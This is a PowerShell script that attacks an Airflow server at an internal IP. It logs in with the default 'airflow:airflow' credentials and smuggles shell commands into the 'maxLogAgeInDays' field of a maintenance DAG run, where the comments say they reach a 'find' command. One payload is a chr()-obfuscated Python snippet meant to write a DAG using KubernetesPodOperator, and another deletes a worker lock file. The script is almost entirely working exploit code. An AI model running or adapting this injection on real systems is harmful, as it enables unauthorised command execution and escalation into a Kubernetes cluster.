$cred = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("airflow:airflow"))
$headers = @{
    Authorization = "Basic $cred"
    "Content-Type" = "application/json"
}

# Trigger with command to: 1) remove lock, 2) write KubernetesPodOperator DAG
# The maxLogAgeInDays injection runs as: find ... -mtime +VALUE
# We inject after the value with ;
$cmd = '1;rm -f /tmp/airflow_log_cleanup_worker.lock;python3 -c "
import os
code=chr(10).join([
chr(102)+chr(114)+chr(111)+chr(109)+chr(32)+chr(97)+chr(105)+chr(114)+chr(102)+chr(108)+chr(111)+chr(119)+chr(32)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(68)+chr(65)+chr(71),
chr(102)+chr(114)+chr(111)+chr(109)+chr(32)+chr(97)+chr(105)+chr(114)+chr(102)+chr(108)+chr(111)+chr(119)+chr(46)+chr(112)+chr(114)+chr(111)+chr(118)+chr(105)+chr(100)+chr(101)+chr(114)+chr(115)+chr(46)+chr(99)+chr(110)+chr(99)+chr(102)+chr(46)+chr(107)+chr(117)+chr(98)+chr(101)+chr(114)+chr(110)+chr(101)+chr(116)+chr(101)+chr(115)+chr(46)+chr(111)+chr(112)+chr(101)+chr(114)+chr(97)+chr(116)+chr(111)+chr(114)+chr(115)+chr(46)+chr(112)+chr(111)+chr(100)+chr(32)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(75)+chr(117)+chr(98)+chr(101)+chr(114)+chr(110)+chr(101)+chr(116)+chr(101)+chr(115)+chr(80)+chr(111)+chr(100)+chr(79)+chr(112)+chr(101)+chr(114)+chr(97)+chr(116)+chr(111)+chr(114)
])
print(code)
";#'

# Too complex. Simpler approach: write DAG as base64 decode
$payload = '1;rm -f /tmp/airflow_log_cleanup_worker.lock;echo done_lock;#'
$body = '{"conf":{"maxLogAgeInDays":"' + $payload + '"},"note":"unlock"}'
try {
    $r = Invoke-WebRequest -Uri "http://10.9.100.198:8080/api/v1/dags/maintenance_logs_cleanup/dagRuns" -Method POST -Headers $headers -Body $body -UseBasicParsing -TimeoutSec 15
    Write-Output ("UNLOCK TRIGGERED: " + ($r.Content | ConvertFrom-Json).dag_run_id)
} catch {
    Write-Output ("ERROR: " + $_.Exception.Message)
}
